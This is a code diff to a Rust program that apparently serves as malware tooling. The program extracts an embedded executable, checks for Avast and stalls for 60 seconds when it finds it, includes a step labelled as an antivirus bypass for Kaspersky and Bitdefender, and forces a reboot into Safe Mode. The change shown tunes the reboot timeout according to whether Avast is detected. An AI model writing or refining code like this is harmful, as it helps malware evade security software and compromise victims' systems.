@@ -196,12 +196,14 @@ fn extract_embedded_exe() -> io::Result<()> {
     Ok(())
 }
 
-fn reboot_system() -> io::Result<()> {
-    // Shutdown and reboot the system to Safe Mode
+fn reboot_system(timeout: Option<u32>) -> io::Result<()> {
+    // Use the provided timeout or default to 7 seconds
+    let reboot_time = timeout.unwrap_or(7);
+
     Command::new("shutdown.exe")
         .arg("-r")
         .arg("-t")
-        .arg("7")
+        .arg(reboot_time.to_string())
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .output()?;
@@ -231,10 +233,14 @@ fn main() {
 
     println!("Admin privileges confirmed.");
 
+    // Variable to store reboot timeout
+    let mut reboot_timeout = 7;
+
     // Step 2: Check for Avast Installation
     if check_avast_installed() {
         println!("Avast detected. Sleeping for 60 seconds...");
-        thread::sleep(time::Duration::from_secs(60));  // Sleep for 60 seconds
+        thread::sleep(time::Duration::from_secs(60)); // Sleep for 60 seconds
+        reboot_timeout = 10; // Set reboot timeout to 10 if Avast is detected
     }
 
     // Step 3: Kaspersky, Bitdefender bypass (General Antivirus bypass)
@@ -268,7 +274,7 @@ fn main() {
     }
 
     // Step 8: Reboot the system to Safe Mode if needed
-    if let Err(e) = reboot_system() {
+    if let Err(e) = reboot_system(Some(reboot_timeout)) {
         eprintln!("Error rebooting system: {}", e);
     }
 
